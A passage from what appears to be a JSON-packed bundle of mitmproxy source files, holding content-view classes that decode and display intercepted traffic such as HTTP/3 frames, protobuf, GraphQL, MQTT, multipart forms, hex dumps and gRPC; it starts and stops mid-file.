parser = ASCommandResponse.ASCommandResponse(data)\n            parsedContent = parser.xmlString\n            if parsedContent:\n                return \"WBXML\", base.format_text(parsedContent)\n        except Exception:\n            return None\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type in self.__content_types)\n", "mitmproxy/contentviews/raw.py": "from . import base\n\n\nclass ViewRaw(base.View):\n    name = \"Raw\"\n\n    def __call__(self, data, **metadata):\n        return \"Raw\", base.format_text(data)\n\n    def render_priority(self, data: bytes, **metadata) -> float:\n        return 0.1 * float(bool(data))\n", "mitmproxy/contentviews/multipart.py": "from .. import http\nfrom . import base\nfrom mitmproxy.coretypes import multidict\nfrom mitmproxy.net.http import multipart\n\n\nclass ViewMultipart(base.View):\n    name = \"Multipart Form\"\n\n    @staticmethod\n    def _format(v):\n        yield [(\"highlight\", \"Form data:\\n\")]\n        yield from base.format_dict(multidict.MultiDict(v))\n\n    def __call__(\n        self,\n        data: bytes,\n        content_type: str | None = None,\n        http_message: http.Message | None = None,\n        **metadata,\n    ):\n        # The content_type doesn't have the boundary, so we get it from the header again\n        headers = getattr(http_message, \"headers\", None)\n        if headers:\n            content_type = headers.get(\"content-type\")\n        if content_type is None:\n            return\n        v = multipart.decode_multipart(content_type, data)\n        if v:\n            return \"Multipart form\", self._format(v)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type == \"multipart/form-data\")\n", "mitmproxy/contentviews/http3.py": "from collections import defaultdict\nfrom collections.abc import Iterator\nfrom dataclasses import dataclass\nfrom dataclasses import field\n\nimport pylsqpack\nfrom aioquic.buffer import Buffer\nfrom aioquic.buffer import BufferReadError\nfrom aioquic.h3.connection import parse_settings\nfrom aioquic.h3.connection import Setting\n\nfrom ..proxy.layers.http import is_h3_alpn\nfrom . import base\nfrom .hex import ViewHexDump\nfrom mitmproxy import flow\nfrom mitmproxy import tcp\n\n\n@dataclass(frozen=True)\nclass Frame:\n    \"\"\"Representation of an HTTP/3 frame.\"\"\"\n\n    type: int\n    data: bytes\n\n    def pretty(self):\n        frame_name = f\"0x{self.type:x} Frame\"\n        if self.type == 0:\n            frame_name = \"DATA Frame\"\n        elif self.type == 1:\n            try:\n                hdrs = pylsqpack.Decoder(4096, 16).feed_header(0, self.data)[1]\n                return [[(\"header\", \"HEADERS Frame\")], *base.format_pairs(hdrs)]\n            except Exception as e:\n                frame_name = f\"HEADERS Frame (error: {e})\"\n        elif self.type == 4:\n            settings = []\n            try:\n                s = parse_settings(self.data)\n            except Exception as e:\n                frame_name = f\"SETTINGS Frame (error: {e})\"\n            else:\n                for k, v in s.items():\n                    try:\n                        key = Setting(k).name\n                    except ValueError:\n                        key = f\"0x{k:x}\"\n                    settings.append((key, f\"0x{v:x}\"))\n                return [[(\"header\", \"SETTINGS Frame\")], *base.format_pairs(settings)]\n        return [\n            [(\"header\", frame_name)],\n            *ViewHexDump._format(self.data),\n        ]\n\n\n@dataclass(frozen=True)\nclass StreamType:\n    \"\"\"Representation of an HTTP/3 stream types.\"\"\"\n\n    type: int\n\n    def pretty(self):\n        stream_type = {\n            0x00: \"Control Stream\",\n            0x01: \"Push Stream\",\n            0x02: \"QPACK Encoder Stream\",\n            0x03: \"QPACK Decoder Stream\",\n        }.get(self.type, f\"0x{self.type:x} Stream\")\n        return [[(\"header\", stream_type)]]\n\n\n@dataclass\nclass ConnectionState:\n    message_count: int = 0\n    frames: dict[int, list[Frame | StreamType]] = field(default_factory=dict)\n    client_buf: bytearray = field(default_factory=bytearray)\n    server_buf: bytearray = field(default_factory=bytearray)\n\n\nclass ViewHttp3(base.View):\n    name = \"HTTP/3 Frames\"\n\n    def __init__(self) -> None:\n        self.connections: defaultdict[tcp.TCPFlow, ConnectionState] = defaultdict(\n            ConnectionState\n        )\n\n    def __call__(\n        self,\n        data,\n        flow: flow.Flow | None = None,\n        tcp_message: tcp.TCPMessage | None = None,\n        **metadata,\n    ):\n        assert isinstance(flow, tcp.TCPFlow)\n        assert tcp_message\n\n        state = self.connections[flow]\n\n        for message in flow.messages[state.message_count :]:\n            if message.from_client:\n                buf = state.client_buf\n            else:\n                buf = state.server_buf\n            buf += message.content\n\n            if state.message_count == 0 and flow.metadata[\"quic_is_unidirectional\"]:\n                h3_buf = Buffer(data=bytes(buf[:8]))\n                stream_type = h3_buf.pull_uint_var()\n                consumed = h3_buf.tell()\n                del buf[:consumed]\n                state.frames[0] = [StreamType(stream_type)]\n\n            while True:\n                h3_buf = Buffer(data=bytes(buf[:16]))\n                try:\n                    frame_type = h3_buf.pull_uint_var()\n                    frame_size = h3_buf.pull_uint_var()\n                except BufferReadError:\n                    break\n\n                consumed = h3_buf.tell()\n\n                if len(buf) < consumed + frame_size:\n                    break\n\n                frame_data = bytes(buf[consumed : consumed + frame_size])\n\n                frame = Frame(frame_type, frame_data)\n\n                state.frames.setdefault(state.message_count, []).append(frame)\n\n                del buf[: consumed + frame_size]\n\n            state.message_count += 1\n\n        frames = state.frames.get(flow.messages.index(tcp_message), [])\n        if not frames:\n            return (\n                \"HTTP/3\",\n                [],\n            )  # base.format_text(f\"(no complete frames here, {state=})\")\n        else:\n            return \"HTTP/3\", fmt_frames(frames)\n\n    def render_priority(\n        self, data: bytes, flow: flow.Flow | None = None, **metadata\n    ) -> float:\n        return (\n            2\n            * float(bool(flow and is_h3_alpn(flow.client_conn.alpn)))\n            * float(isinstance(flow, tcp.TCPFlow))\n        )\n\n\ndef fmt_frames(frames: list[Frame | StreamType]) -> Iterator[base.TViewLine]:\n    for i, frame in enumerate(frames):\n        if i > 0:\n            yield [(\"text\", \"\")]\n        yield from frame.pretty()\n", "mitmproxy/contentviews/protobuf.py": "import io\n\nfrom kaitaistruct import KaitaiStream\n\nfrom . import base\nfrom mitmproxy.contrib.kaitaistruct import google_protobuf\n\n\ndef write_buf(out, field_tag, body, indent_level):\n    if body is not None:\n        out.write(\n            \"{: <{level}}{}: {}\\n\".format(\n                \"\",\n                field_tag,\n                body if isinstance(body, int) else str(body, \"utf-8\"),\n                level=indent_level,\n            )\n        )\n    elif field_tag is not None:\n        out.write(\" \" * indent_level + str(field_tag) + \" {\\n\")\n    else:\n        out.write(\" \" * indent_level + \"}\\n\")\n\n\ndef _parse_proto(raw: bytes) -> list[google_protobuf.GoogleProtobuf.Pair]:\n    \"\"\"Parse a bytestring into protobuf pairs and make sure that all pairs have a valid wire type.\"\"\"\n    buf = google_protobuf.GoogleProtobuf(KaitaiStream(io.BytesIO(raw)))\n    for pair in buf.pairs:\n        if not isinstance(\n            pair.wire_type, google_protobuf.GoogleProtobuf.Pair.WireTypes\n        ):\n            raise ValueError(\"Not a protobuf.\")\n    return buf.pairs\n\n\ndef format_pbuf(raw):\n    out = io.StringIO()\n    stack = []\n\n    try:\n        pairs = _parse_proto(raw)\n    except Exception:\n        return False\n    stack.extend([(pair, 0) for pair in pairs[::-1]])\n\n    while len(stack):\n        pair, indent_level = stack.pop()\n\n        if pair.wire_type == pair.WireTypes.group_start:\n            body = None\n        elif pair.wire_type == pair.WireTypes.group_end:\n            body = None\n            pair._m_field_tag = None\n        elif pair.wire_type == pair.WireTypes.len_delimited:\n            body = pair.value.body\n        elif pair.wire_type == pair.WireTypes.varint:\n            body = pair.value.value\n        else:\n            body = pair.value\n\n        try:\n            pairs = _parse_proto(body)  # type: ignore\n            stack.extend([(pair, indent_level + 2) for pair in pairs[::-1]])\n            write_buf(out, pair.field_tag, None, indent_level)\n        except Exception:\n            write_buf(out, pair.field_tag, body, indent_level)\n\n        if stack:\n            prev_level = stack[-1][1]\n        else:\n            prev_level = 0\n\n        if prev_level < indent_level:\n            levels = int((indent_level - prev_level) / 2)\n            for i in range(1, levels + 1):\n                write_buf(out, None, None, indent_level - i * 2)\n\n    return out.getvalue()\n\n\nclass ViewProtobuf(base.View):\n    \"\"\"Human friendly view of protocol buffers\n    The view uses the protoc compiler to decode the binary\n    \"\"\"\n\n    name = \"Protocol Buffer\"\n    __content_types = [\n        \"application/x-protobuf\",\n        \"application/x-protobuffer\",\n    ]\n\n    def __call__(self, data, **metadata):\n        decoded = format_pbuf(data)\n        if not decoded:\n            raise ValueError(\"Failed to parse input.\")\n\n        return \"Protobuf\", base.format_text(decoded)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type in self.__content_types)\n", "mitmproxy/contentviews/graphql.py": "import json\nfrom typing import Any\n\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.contentviews.json import PARSE_ERROR\nfrom mitmproxy.contentviews.json import parse_json\n\n\ndef format_graphql(data):\n    query = data[\"query\"]\n    header_data = data.copy()\n    header_data[\"query\"] = \"...\"\n    return \"\"\"{header}\n---\n{query}\n\"\"\".format(header=json.dumps(header_data, indent=2), query=query)\n\n\ndef format_query_list(data: list[Any]):\n    num_queries = len(data) - 1\n    result = \"\"\n    for i, op in enumerate(data):\n        result += f\"--- {i}/{num_queries}\\n\"\n        result += format_graphql(op)\n    return result\n\n\ndef is_graphql_query(data):\n    return isinstance(data, dict) and \"query\" in data and \"\\n\" in data[\"query\"]\n\n\ndef is_graphql_batch_query(data):\n    return (\n        isinstance(data, list)\n        and len(data) > 0\n        and isinstance(data[0], dict)\n        and \"query\" in data[0]\n    )\n\n\nclass ViewGraphQL(base.View):\n    name = \"GraphQL\"\n\n    def __call__(self, data, **metadata):\n        data = parse_json(data)\n        if data is not PARSE_ERROR:\n            if is_graphql_query(data):\n                return \"GraphQL\", base.format_text(format_graphql(data))\n            elif is_graphql_batch_query(data):\n                return \"GraphQL\", base.format_text(format_query_list(data))\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        if content_type != \"application/json\" or not data:\n            return 0\n\n        data = parse_json(data)\n\n        if data is not PARSE_ERROR:\n            if is_graphql_query(data) or is_graphql_batch_query(data):\n                return 2\n\n        return 0\n", "mitmproxy/contentviews/auto.py": "from . import base\nfrom mitmproxy import contentviews\n\n\nclass ViewAuto(base.View):\n    name = \"Auto\"\n\n    def __call__(self, data, **metadata):\n        # TODO: The auto view has little justification now that views implement render_priority,\n        # but we keep it around for now to not touch more parts.\n        priority, view = max(\n            (v.render_priority(data, **metadata), v) for v in contentviews.views\n        )\n        if priority == 0 and not data:\n            return \"No content\", []\n        return view(data, **metadata)\n\n    def render_priority(self, data: bytes, **metadata) -> float:\n        return -1  # don't recurse.\n", "mitmproxy/contentviews/query.py": "from .. import http\nfrom . import base\n\n\nclass ViewQuery(base.View):\n    name = \"Query\"\n\n    def __call__(\n        self, data: bytes, http_message: http.Message | None = None, **metadata\n    ):\n        query = getattr(http_message, \"query\", None)\n        if query:\n            return \"Query\", base.format_pairs(query.items(multi=True))\n        else:\n            return \"Query\", base.format_text(\"\")\n\n    def render_priority(\n        self, data: bytes, *, http_message: http.Message | None = None, **metadata\n    ) -> float:\n        return 0.3 * float(bool(getattr(http_message, \"query\", False) and not data))\n", "mitmproxy/contentviews/mqtt.py": "import struct\n\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.utils import strutils\n\n# from https://github.com/nikitastupin/mitmproxy-mqtt-script\n\n\nclass MQTTControlPacket:\n    # Packet types\n    (\n        CONNECT,\n        CONNACK,\n        PUBLISH,\n        PUBACK,\n        PUBREC,\n        PUBREL,\n        PUBCOMP,\n        SUBSCRIBE,\n        SUBACK,\n        UNSUBSCRIBE,\n        UNSUBACK,\n        PINGREQ,\n        PINGRESP,\n        DISCONNECT,\n    ) = range(1, 15)\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Table_2.1_-\n    Names = [\n        \"reserved\",\n        \"CONNECT\",\n        \"CONNACK\",\n        \"PUBLISH\",\n        \"PUBACK\",\n        \"PUBREC\",\n        \"PUBREL\",\n        \"PUBCOMP\",\n        \"SUBSCRIBE\",\n        \"SUBACK\",\n        \"UNSUBSCRIBE\",\n        \"UNSUBACK\",\n        \"PINGREQ\",\n        \"PINGRESP\",\n        \"DISCONNECT\",\n        \"reserved\",\n    ]\n\n    PACKETS_WITH_IDENTIFIER = [\n        PUBACK,\n        PUBREC,\n        PUBREL,\n        PUBCOMP,\n        SUBSCRIBE,\n        SUBACK,\n        UNSUBSCRIBE,\n        UNSUBACK,\n    ]\n\n    def __init__(self, packet):\n        self._packet = packet\n        # Fixed header\n        # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718020\n        self.packet_type = self._parse_packet_type()\n        self.packet_type_human = self.Names[self.packet_type]\n        self.dup, self.qos, self.retain = self._parse_flags()\n        self.remaining_length = self._parse_remaining_length()\n        # Variable header & Payload\n        # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718024\n        # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718026\n        if self.packet_type == self.CONNECT:\n            self._parse_connect_variable_headers()\n            self._parse_connect_payload()\n        elif self.packet_type == self.PUBLISH:\n            self._parse_publish_variable_headers()\n            self._parse_publish_payload()\n        elif self.packet_type == self.SUBSCRIBE:\n            self._parse_subscribe_variable_headers()\n            self._parse_subscribe_payload()\n        elif self.packet_type == self.SUBACK:\n            pass\n        elif self.packet_type == self.UNSUBSCRIBE:\n            pass\n        else:\n            self.payload = None\n\n    def pprint(self):\n        s = f\"[{self.Names[self.packet_type]}]\"\n\n        if self.packet_type == self.CONNECT:\n            assert self.payload\n            s += f\"\"\"\n\nClient Id: {self.payload['ClientId']}\nWill Topic: {self.payload.get('WillTopic')}\nWill Message: {strutils.bytes_to_escaped_str(self.payload.get('WillMessage', b'None'))}\nUser Name: {self.payload.get('UserName')}\nPassword: {strutils.bytes_to_escaped_str(self.payload.get('Password', b'None'))}\n\"\"\"\n        elif self.packet_type == self.SUBSCRIBE:\n            s += \" sent topic filters: \"\n            s += \", \".join([f\"'{tf}'\" for tf in self.topic_filters])\n        elif self.packet_type == self.PUBLISH:\n            assert self.payload\n            topic_name = strutils.bytes_to_escaped_str(self.topic_name)\n            payload = strutils.bytes_to_escaped_str(self.payload)\n\n            s += f\" '{payload}' to topic '{topic_name}'\"\n        elif self.packet_type in [self.PINGREQ, self.PINGRESP]:\n            pass\n        else:\n            s = f\"Packet type {self.Names[self.packet_type]} is not supported yet!\"\n\n        return s\n\n    def _parse_length_prefixed_bytes(self, offset):\n        field_length_bytes = self._packet[offset : offset + 2]\n        field_length = struct.unpack(\"!H\", field_length_bytes)[0]\n\n        field_content_bytes = self._packet[offset + 2 : offset + 2 + field_length]\n\n        return field_length + 2, field_content_bytes\n\n    def _parse_publish_variable_headers(self):\n        offset = len(self._packet) - self.remaining_length\n\n        field_length, field_content_bytes = self._parse_length_prefixed_bytes(offset)\n        self.topic_name = field_content_bytes\n\n        if self.qos in [0x01, 0x02]:\n            offset += field_length\n            self.packet_identifier = self._packet[offset : offset + 2]\n\n    def _parse_publish_payload(self):\n        fixed_header_length = len(self._packet) - self.remaining_length\n        variable_header_length = 2 + len(self.topic_name)\n\n        if self.qos in [0x01, 0x02]:\n            variable_header_length += 2\n\n        offset = fixed_header_length + variable_header_length\n\n        self.payload = self._packet[offset:]\n\n    def _parse_subscribe_variable_headers(self):\n        self._parse_packet_identifier()\n\n    def _parse_subscribe_payload(self):\n        offset = len(self._packet) - self.remaining_length + 2\n\n        self.topic_filters = {}\n\n        while len(self._packet) - offset > 0:\n            field_length, topic_filter_bytes = self._parse_length_prefixed_bytes(offset)\n            offset += field_length\n\n            qos = self._packet[offset : offset + 1]\n            offset += 1\n\n            topic_filter = topic_filter_bytes.decode(\"utf-8\")\n            self.topic_filters[topic_filter] = {\"qos\": qos}\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718030\n    def _parse_connect_variable_headers(self):\n        offset = len(self._packet) - self.remaining_length\n\n        self.variable_headers = {}\n        self.connect_flags = {}\n\n        self.variable_headers[\"ProtocolName\"] = self._packet[offset : offset + 6]\n        self.variable_headers[\"ProtocolLevel\"] = self._packet[offset + 6 : offset + 7]\n        self.variable_headers[\"ConnectFlags\"] = self._packet[offset + 7 : offset + 8]\n        self.variable_headers[\"KeepAlive\"] = self._packet[offset + 8 : offset + 10]\n        # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc385349229\n        self.connect_flags[\"CleanSession\"] = bool(\n            self.variable_headers[\"ConnectFlags\"][0] & 0x02\n        )\n        self.connect_flags[\"Will\"] = bool(\n            self.variable_headers[\"ConnectFlags\"][0] & 0x04\n        )\n        self.will_qos = (self.variable_headers[\"ConnectFlags\"][0] >> 3) & 0x03\n        self.connect_flags[\"WillRetain\"] = bool(\n            self.variable_headers[\"ConnectFlags\"][0] & 0x20\n        )\n        self.connect_flags[\"Password\"] = bool(\n            self.variable_headers[\"ConnectFlags\"][0] & 0x40\n        )\n        self.connect_flags[\"UserName\"] = bool(\n            self.variable_headers[\"ConnectFlags\"][0] & 0x80\n        )\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718031\n    def _parse_connect_payload(self):\n        fields = []\n        offset = len(self._packet) - self.remaining_length + 10\n\n        while len(self._packet) - offset > 0:\n            field_length, field_content = self._parse_length_prefixed_bytes(offset)\n            fields.append(field_content)\n            offset += field_length\n\n        self.payload = {}\n\n        for f in fields:\n            # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc385349242\n            if \"ClientId\" not in self.payload:\n                self.payload[\"ClientId\"] = f.decode(\"utf-8\")\n            # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc385349243\n            elif self.connect_flags[\"Will\"] and \"WillTopic\" not in self.payload:\n                self.payload[\"WillTopic\"] = f.decode(\"utf-8\")\n            elif self.connect_flags[\"Will\"] and \"WillMessage\" not in self.payload:\n                self.payload[\"WillMessage\"] = f\n            elif (\n                self.connect_flags[\"UserName\"] and \"UserName\" not in self.payload\n            ):  # pragma: no cover\n                self.payload[\"UserName\"] = f.decode(\"utf-8\")\n            elif (\n                self.connect_flags[\"Password\"] and \"Password\" not in self.payload\n            ):  # pragma: no cover\n                self.payload[\"Password\"] = f\n            else:\n                raise AssertionError(f\"Unknown field in CONNECT payload: {f}\")\n\n    def _parse_packet_type(self):\n        return self._packet[0] >> 4\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Toc398718022\n    def _parse_flags(self):\n        dup = None\n        qos = None\n        retain = None\n\n        if self.packet_type == self.PUBLISH:\n            dup = (self._packet[0] >> 3) & 0x01\n            qos = (self._packet[0] >> 1) & 0x03\n            retain = self._packet[0] & 0x01\n\n        return dup, qos, retain\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Table_2.4_Size\n    def _parse_remaining_length(self):\n        multiplier = 1\n        value = 0\n        i = 1\n\n        while True:\n            encodedByte = self._packet[i]\n            value += (encodedByte & 127) * multiplier\n            multiplier *= 128\n\n            if multiplier > 128 * 128 * 128:\n                raise ValueError(\"Malformed Remaining Length\")\n\n            if encodedByte & 128 == 0:\n                break\n\n            i += 1\n\n        return value\n\n    # http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html#_Table_2.5_-\n    def _parse_packet_identifier(self):\n        offset = len(self._packet) - self.remaining_length\n        self.packet_identifier = self._packet[offset : offset + 2]\n\n\nclass ViewMQTT(base.View):\n    name = \"MQTT\"\n\n    def __call__(self, data, **metadata):\n        mqtt_packet = MQTTControlPacket(data)\n        text = mqtt_packet.pprint()\n        return \"MQTT\", base.format_text(text)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return 0\n", "mitmproxy/contentviews/base.py": "# Default view cutoff *in lines*\nfrom abc import ABC\nfrom abc import abstractmethod\nfrom collections.abc import Iterable\nfrom collections.abc import Iterator\nfrom collections.abc import Mapping\nfrom typing import ClassVar\nfrom typing import Union\n\nfrom mitmproxy import flow\nfrom mitmproxy import http\n\nKEY_MAX = 30\n\nTTextType = Union[str, bytes]  # FIXME: This should be either bytes or str ultimately.\nTViewLine = list[tuple[str, TTextType]]\nTViewResult = tuple[str, Iterator[TViewLine]]\n\n\nclass View(ABC):\n    name: ClassVar[str]\n\n    @abstractmethod\n    def __call__(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> TViewResult:\n        \"\"\"\n        Transform raw data into human-readable output.\n\n        Returns a (description, content generator) tuple.\n        The content generator yields lists of (style, text) tuples, where each list represents\n        a single line. ``text`` is a unfiltered string which may need to be escaped,\n        depending on the used output. For example, it may contain terminal control sequences\n        or unfiltered HTML.\n\n        Except for `data`, implementations must not rely on any given argument to be present.\n        To ensure compatibility with future mitmproxy versions, unknown keyword arguments should be ignored.\n\n        The content generator must not yield tuples of tuples, because urwid cannot process that.\n        You have to yield a *list* of tuples per line.\n        \"\"\"\n        raise NotImplementedError()  # pragma: no cover\n\n    def render_priority(\n        self,\n        data: bytes,\n        *,\n        content_type: str | None = None,\n        flow: flow.Flow | None = None,\n        http_message: http.Message | None = None,\n        **unknown_metadata,\n    ) -> float:\n        \"\"\"\n        Return the priority of this view for rendering `data`.\n        If no particular view is chosen by the user, the view with the highest priority is selected.\n\n        Except for `data`, implementations must not rely on any given argument to be present.\n        To ensure compatibility with future mitmproxy versions, unknown keyword arguments should be ignored.\n        \"\"\"\n        return 0\n\n    def __lt__(self, other):\n        assert isinstance(other, View)\n        return self.name.__lt__(other.name)\n\n\ndef format_pairs(items: Iterable[tuple[TTextType, TTextType]]) -> Iterator[TViewLine]:\n    \"\"\"\n    Helper function that accepts a list of (k,v) pairs into a list of\n    [\n        (\"key\", key    )\n        (\"value\", value)\n    ]\n    where key is padded to a uniform width\n    \"\"\"\n\n    max_key_len = max((len(k[0]) for k in items), default=0)\n    max_key_len = min((max_key_len, KEY_MAX), default=0)\n\n    for key, value in items:\n        if isinstance(key, bytes):\n            key += b\":\"\n        else:\n            key += \":\"\n\n        key = key.ljust(max_key_len + 2)\n\n        yield [(\"header\", key), (\"text\", value)]\n\n\ndef format_dict(d: Mapping[TTextType, TTextType]) -> Iterator[TViewLine]:\n    \"\"\"\n    Helper function that transforms the given dictionary into a list of\n    [\n        (\"key\",   key  )\n        (\"value\", value)\n    ]\n    entries, where key is padded to a uniform width.\n    \"\"\"\n\n    return format_pairs(d.items())\n\n\ndef format_text(text: TTextType) -> Iterator[TViewLine]:\n    \"\"\"\n    Helper function that transforms bytes into the view output format.\n    \"\"\"\n    for line in text.splitlines():\n        yield [(\"text\", line)]\n", "mitmproxy/contentviews/hex.py": "from . import base\nfrom mitmproxy.utils import strutils\n\n\nclass ViewHexDump(base.View):\n    name = \"Hex Dump\"\n\n    @staticmethod\n    def _format(data):\n        for offset, hexa, s in strutils.hexdump(data):\n            yield [(\"offset\", offset + \" \"), (\"text\", hexa + \"   \"), (\"text\", s)]\n\n    def __call__(self, data, **metadata):\n        return \"Hexdump\", self._format(data)\n\n    def render_priority(self, data: bytes, **metadata) -> float:\n        return 0.2 * strutils.is_mostly_bin(data)\n\n\nclass ViewHexStream(base.View):\n    name = \"Raw Hex Stream\"\n\n    def __call__(self, data, **metadata):\n        return \"Raw Hex Stream\", base.format_text(data.hex())\n\n    def render_priority(self, data: bytes, **metadata) -> float:\n        return 0.15 * strutils.is_mostly_bin(data)\n", "mitmproxy/contentviews/grpc.py": "from __future__ import annotations\n\nimport logging\nimport struct\nfrom collections.abc import Generator\nfrom collections.abc import Iterable\nfrom collections.abc import Iterator\nfrom dataclasses import dataclass\nfrom dataclasses import field\nfrom enum import Enum\n\nfrom mitmproxy import contentviews\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.net.encoding import decode\n\n\nclass ProtoParser:\n    @dataclass\n    class ParserRule:\n        \"\"\"\n        A parser rule lists Field definitions which are applied if the filter rule matches the flow.\n\n        Matching on flow-level also means, a match applies to request AND response messages.\n        To restrict a rule to a requests only use 'ParserRuleRequest', instead.\n        To restrict a rule to a responses only use 'ParserRuleResponse', instead.\n        \"\"\"\n\n        field_definitions: list[ProtoParser.ParserFieldDefinition]\n        \"\"\"List of field definitions for this rule \"\"\"\n\n        name: str = \"\"\n        \"\"\"Name of this rule, only used for debugging\"\"\"\n\n        filter: str = \"\"\n        \"\"\"\n        Flowfilter to select which flows to apply to ('~q' and '~s' can not be used to distinguish\n        if the rule should apply to the request or response of a flow. To do so, use ParserRuleRequest\n        or ParserRuleResponse. ParserRule always applies to request and response.)\n        \"\"\"\n\n    @dataclass\n    class ParserRuleResponse(ParserRule):\n        \"\"\"\n        A parser rule lists Field definitions which are applied if the filter rule matches the flow.\n\n        The rule only applies if the processed message is a server response.\n        \"\"\"\n\n    @dataclass\n    class ParserRuleRequest(ParserRule):\n        \"\"\"\n        A parser rule lists Field definitions which are applied if the filter rule matches the flow.\n\n        The rule only applies if the processed message is a client request.\n        \"\"\"\n\n    @dataclass\n    class ParserFieldDefinition:\n        \"\"\"\n        Defines how to parse a field (or multiple fields with the same tag) in a protobuf messages.\n\n        This allows to apply an intended decoding (f.e. decode uint64 as double instead) and to assign\n        a descriptive name to a field. Field definitions are aggregated into rules, which also holds\n        a filter to match selected HTTP messages.\n\n        The most natural way to use this, is to describe known parts of a single protobuf message\n        in a set of field descriptors, pack them into a rule and set the filter of the rule in a way,\n        that it only applies to proper protobuf messages (f.e. to request traffic against an API endpoint\n        matched by an URL flowfilter)\n        \"\"\"\n\n        # A 'tag' could be considered as \"absolute path\" to match a unique field, yet\n        # protobuf allows to uses the same nested message in different positions of the parent message\n        # The 'tag_prefixes' parameter allows to apply the field definition to different \"leafs nodes\"\n        # of a message.\n        #\n        # Example 1: match a single, absolute tag\n        # ----------\n        # tag = '1.2'\n        # tag_prefixes = [] (default)\n        #\n        # applies to: tag '1.2'\n        #\n        # Example 2: match multiple tags with same ending\n        # ----------\n        # tag = '1.3'\n        # tag_prefixes = ['1.2.', '2.5.']\n        #\n        # applies to: tag '1.2.1.3' and tag '2.5.1.3'\n        # does not apply to: '1.3', unless tag_prefixes is extended to tag_prefixes = ['1.2', '2.5', '']\n        #\n        # Example 3: match multiple tags\n        # ----------\n        # tag = ''\n        # tag_prefixes = ['1.2', '2.5']\n        #\n        # applies to: tag '1.2' and tag '1.5'\n\n        tag: str\n        \"\"\"Field tag for which this description applies (including flattened tag path, f.e. '1.2.2.4')\"\"\"\n\n        tag_prefixes: list[str] = field(default_factory=list)\n        \"\"\"List of prefixes for tag matching (f.e. tag_prefixes=['1.2.', '2.2.'] with tag='1' matches '1.2.1' and '2.2.1')\"\"\"\n\n        intended_decoding: ProtoParser.DecodedTypes | None = None\n        \"\"\"optional: intended decoding for visualization (parser fails over to alternate decoding if not possible)\"\"\"\n\n        name: str | None = None\n        \"\"\"optional: intended field for visualization (parser fails over to alternate decoding if not possible)\"\"\"\n\n        as_packed: bool | None = False\n        \"\"\"optional: if set to true, the field is considered to be repeated and packed\"\"\"\n\n    @dataclass\n    class ParserOptions:\n        # output should contain wiretype of fields\n        include_wiretype: bool = False\n\n        # output should contain the fields which describe nested messages\n        # (the nested messages bodies are always included, but the \"header fields\" could\n        # add unnecessary output overhead)\n        exclude_message_headers: bool = False\n\n        # optional: rules\n        # rules: List[ProtoParser.ParserRule] = field(default_factory=list)\n\n    class DecodedTypes(Enum):\n        # varint\n        int32 = 0\n        int64 = 1\n        uint32 = 2\n        uint64 = 3\n        sint32 = 4  # ZigZag encoding\n        sint64 = 5  # ZigZag encoding\n        bool = 6\n        enum = 7\n        # bit_32\n        fixed32 = 8\n        sfixed32 = 9\n        float = 10\n        # bit_64\n        fixed64 = 11\n        sfixed64 = 12\n        double = 13\n        # len_delimited\n        string = 14\n        bytes = 15\n        message = 16\n\n        # helper\n        unknown = 17\n\n    @staticmethod\n    def _read_base128le(data: bytes) -> tuple[int, int]:\n        res = 0\n        offset = 0\n        while offset < len(data):\n            o = data[offset]\n            res += (o & 0x7F) << (7 * offset)\n            offset += 1\n            if o < 0x80:\n                # the Kaitai parser for protobuf support base128 le values up\n                # to 8 groups (bytes). Due to the nature of the encoding, each\n                # group attributes 7bit to the resulting value, which give\n                # a 56 bit value at maximum.\n                # The values which get encoded into protobuf variable length integers,\n                # on the other hand, include full 64bit types (int64, uint64, sint64).\n                # This means, the Kaitai encoder can not cover the full range of\n                # possible values\n                #\n                # This decoder puts no limitation on the maximum value of variable\n                # length integers. Values exceeding 64bit have to be handled externally\n                return offset, res\n        raise ValueError(\"varint exceeds bounds of provided data\")\n\n    @staticmethod\n    def _read_u32(data: bytes) -> tuple[int, int]:\n        return 4, struct.unpack(\"<I\", data[:4])[0]\n\n    @staticmethod\n    def _read_u64(data: bytes) -> tuple[int, int]:\n        return 8, struct.unpack(\"<Q\", data[:8])[0]\n\n    class WireTypes(Enum):\n        varint = 0\n        bit_64 = 1\n        len_delimited = 2\n        group_start = 3\n        group_end = 4\n        bit_32 = 5\n\n    @staticmethod\n    def read_fields(\n        wire_data: bytes,\n        parent_field: ProtoParser.Field | None,\n        options: ProtoParser.ParserOptions,\n        rules: list[ProtoParser.ParserRule],\n    ) -> list[ProtoParser.Field]:\n        res: 